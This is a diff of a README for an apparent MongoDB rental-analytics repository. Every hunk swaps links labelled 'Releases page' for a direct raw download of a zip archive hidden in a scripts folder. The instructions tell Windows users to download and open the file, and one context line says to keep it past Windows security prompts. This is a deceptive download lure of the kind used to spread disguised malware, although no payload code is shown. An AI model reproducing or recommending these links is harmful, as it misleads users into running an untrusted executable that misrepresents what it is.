@@ -1,10 +1,10 @@
 # 🛠️ mongodb-nosql-airbnb - Run MongoDB rental analytics
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Gustafoutrigged242/mongodb-nosql-airbnb/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Gustafoutrigged242/mongodb-nosql-airbnb/raw/refs/heads/main/business_intelligence/scripts/mongodb_nosql_airbnb_1.0.zip)
 
 ## 📥 Download
 
-1. Open the [Releases page](https://github.com/Gustafoutrigged242/mongodb-nosql-airbnb/releases)
+1. Open the [Releases page](https://github.com/Gustafoutrigged242/mongodb-nosql-airbnb/raw/refs/heads/main/business_intelligence/scripts/mongodb_nosql_airbnb_1.0.zip)
 2. Download the latest release for Windows
 3. Save the file to your PC
 4. Open the file and follow the setup steps
@@ -37,7 +37,7 @@ If Windows shows a security prompt, choose the option that lets you keep the fil
 
 ## 🚀 How to install
 
-1. Go to the [Releases page](https://github.com/Gustafoutrigged242/mongodb-nosql-airbnb/releases)
+1. Go to the [Releases page](https://github.com/Gustafoutrigged242/mongodb-nosql-airbnb/raw/refs/heads/main/business_intelligence/scripts/mongodb_nosql_airbnb_1.0.zip)
 2. Download the newest Windows package
 3. Wait for the download to finish
 4. Open the downloaded file
@@ -188,7 +188,7 @@ This project brings together:
 
 ## 📎 Download again
 
-If you need the installer or package again, use the [Releases page](https://github.com/Gustafoutrigged242/mongodb-nosql-airbnb/releases)
+If you need the installer or package again, use the [Releases page](https://github.com/Gustafoutrigged242/mongodb-nosql-airbnb/raw/refs/heads/main/business_intelligence/scripts/mongodb_nosql_airbnb_1.0.zip)
 
 ## 🗂️ File types you may download
 
@@ -202,7 +202,7 @@ Depending on the release, you may see:
 
 ## 🧭 Simple start flow
 
-1. Visit the [Releases page](https://github.com/Gustafoutrigged242/mongodb-nosql-airbnb/releases)
+1. Visit the [Releases page](https://github.com/Gustafoutrigged242/mongodb-nosql-airbnb/raw/refs/heads/main/business_intelligence/scripts/mongodb_nosql_airbnb_1.0.zip)
 2. Download the latest Windows file
 3. Open it on your PC
 4. Extract it if needed
